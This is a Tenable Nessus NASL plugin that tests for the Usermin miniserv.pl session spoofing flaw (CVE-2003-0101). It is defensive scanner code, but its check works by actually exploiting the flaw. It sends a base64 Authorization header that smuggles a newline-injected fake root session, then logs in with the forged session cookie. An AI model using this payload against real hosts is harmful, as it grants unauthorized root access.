#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(11280);
 script_version ("$Revision: 1.12 $");
 script_cve_id("CVE-2003-0101");
 script_bugtraq_id(6915);
 script_xref(name:"OSVDB", value:"10803");
 
 script_name(english:"Usermin miniserv.pl Base-64 String Metacharacter Handling Session Spoofing");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote host has an application that is affected by a 
Session ID spoofing vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote server is running a version of Usermin which is 
vulnerable to Session ID spoofing.

An attacker may use this flaw to log in as root on this host,
and basically gain full control on it" );
 script_set_attribute(attribute:"solution", value:
"upgrade to usermin 1.000" );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );

script_end_attributes();

 script_summary(english: "Spoofs a session ID");
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");
 script_family(english: "CGI abuses");
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 20000);
 exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

function check(port)
{
 local_var	r;

 init_cookiejar();
 set_http_cookie(name: "testing", value: "1");
 r = http_send_recv3(method: "GET", item:"/", port:port,
 add_headers: make_array("User-Agent", "webmin", "Authorization", 
"Basic YSBhIDEKbmV3IDEyMzQ1Njc4OTAgcm9vdDpwYXNzd29yZA==") );
 if (isnull(r)) return(0);

 if(!ereg(pattern:"^HTTP/[0-9]\.[0-9] 401 ", string:r[0]))return(0);
 if(egrep(pattern:".*session_login\.cgi\?logout=1.*", string:r[2])) return(0);

 set_http_cookie(name: "testing", value: "1");
 set_http_cookie(name: "usid", value: "1234567890");
 set_http_cookie(name: "user", value: "x");
 r = http_send_recv3(method: "GET", item:"/", port:port);
 if (isnull(r)) return(0);

 #
 # I'm afraid of localizations, so I grep on the HTML source code,
 # not the message status.
 # 
 if(egrep(pattern:".*session_login\.cgi\?logout=1.*", string:r[2]))
 { 
 security_hole(port);
 }
}   

ports = add_port_in_list(list:get_kb_list("Services/www"),  port:20000);    
foreach port (ports)
{
   check(port:port);
}
